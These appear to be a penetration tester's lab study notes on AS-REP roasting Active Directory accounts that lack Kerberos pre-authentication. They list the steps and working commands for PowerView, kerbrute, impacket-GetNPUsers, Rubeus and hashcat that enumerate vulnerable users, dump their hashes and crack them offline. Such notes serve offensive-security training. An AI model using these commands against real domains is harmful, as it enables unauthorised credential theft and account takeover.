Attack against users with **"Do not require Kerberos pre-authentication"** enabled that Allows you to request TGT without knowing the password we can  crack hash for offline cracking

Steps:
- Find users with pre-auth disabled
- Request TGT for that user (no password needed)
- Receive encrypted TGT that's encrypted with user's password
- Crack the TGT encryption offline

**NOTE** we cant pass this hash if we cant crack it its a deadEND


```sh

Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView


kerbrute userenum --dc spookysec.local -d spookysec.local users.txt --downgrade

#output hash
impacket-getnpusers oscp.lab/wade -outputfile bernie.asrep

Impacket-GetNPUsers -dc-ip <ip> -usersfile users.txt 
<domain_name/domain_user>

#if we are in the domain 
impacket-getnpusers oscp.lab/wade

# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast /outfile:<Out>
```

Cracking with dictionary of hash to recover the password :

```sh
hashcat -m 18200 -a 0 <AS_Response_Hash> <wordlist> --force
```


**note**

we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows
